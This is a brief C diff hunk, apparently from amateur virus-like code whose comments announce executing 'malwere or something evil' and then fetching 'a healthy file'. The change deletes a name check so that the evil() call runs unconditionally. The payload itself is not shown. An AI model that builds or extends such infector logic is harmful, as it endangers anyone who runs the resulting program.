@@ -39,8 +39,6 @@ void main(int argc, char *argv[])
     fstat(vfd, &st);
 
     //execute a malwere or something evil
-    char *x="./ls";
-    if(strcmp(x,argv[0])==0)
     evil();
 
     //geting a healthy file
